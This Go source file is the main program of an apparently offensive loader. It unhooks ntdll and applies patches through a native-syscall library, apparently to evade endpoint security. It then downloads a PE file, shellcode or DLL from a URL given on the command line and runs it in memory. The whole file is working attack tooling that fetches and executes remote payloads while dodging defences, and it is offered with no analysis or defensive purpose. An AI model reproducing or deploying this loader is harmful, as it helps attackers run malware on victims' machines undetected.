package main  

import (
	"flag"
	"fmt"
	"log"
	"loader/pkg/pe"
	"loader/pkg/dll"
	"github.com/carved4/go-native-syscall"
	"loader/pkg/net"
)

func main() {
	winapi.UnhookNtdll()
	winapi.ApplyAllPatches()
	
	var (
		usePE       = flag.Bool("pe", false, "Load and execute PE file")
		useShellcode = flag.Bool("shellcode", false, "Execute shellcode")
		useDLL      = flag.Bool("dll", false, "Load and execute DLL")
		url         = flag.String("url", "", "URL to download the file from")
		funcName    = flag.String("func", "", "Function name for DLL execution")
	)
	
	flag.Parse()
	
	flagCount := 0
	if *usePE { flagCount++ }
	if *useShellcode { flagCount++ }
	if *useDLL { flagCount++ }
	
	if flagCount == 0 {
		fmt.Println("Usage: program [-pe|-shellcode|-dll] -url <URL> [-func <function_name>]")
		fmt.Println("  -pe:        Load and execute PE file")
		fmt.Println("  -shellcode: Execute shellcode")
		fmt.Println("  -dll:       Load and execute DLL")
		fmt.Println("  -url:       URL to download the file from")
		fmt.Println("  -func:      Function name for DLL execution")
		return
	}
	
	if flagCount > 1 {
		log.Fatalln("[ERROR] Only one execution type can be specified")
	}

	if *url == "" {
		log.Fatalln("[ERROR] URL must be specified")
	}
	
	fileBytes, err := net.DownloadFile(*url)
	if err != nil {
		log.Fatalf("[ERROR] Failed to download file: %v\n", err)
	}
	
	if *usePE {
		err := pe.LoadPEFromBytes(fileBytes)
		if err != nil {
			log.Fatalf("[ERROR] Failed to load PE: %v\n", err)
		}
		
	} else if *useShellcode {
		err := winapi.NtInjectSelfShellcode(fileBytes)
		if err != nil {
			winapi.NtInjectSelfShellcode(fileBytes)
		}
	} else if *useDLL {
		err := dll.LoadDLL(fileBytes, *funcName)
		if err != nil {
			log.Fatalf("[ERROR] Failed to load DLL: %v\n", err)
		}
	}
}

